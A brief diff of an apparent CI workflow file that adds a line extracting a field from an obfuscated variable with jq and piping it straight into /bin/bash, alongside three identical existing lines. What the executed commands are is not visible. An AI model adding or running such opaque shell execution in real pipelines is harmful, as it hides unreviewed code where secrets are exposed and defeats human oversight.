@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$jzy57068" | jq -r .jhkta99 | /bin/bash
           echo $vq5402 | jq -r .bc5 | /bin/bash
           echo $vs4045 | jq -r .dierl186 | /bin/bash
+          printf '%s' "$b0" | jq -r .hdaf416 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
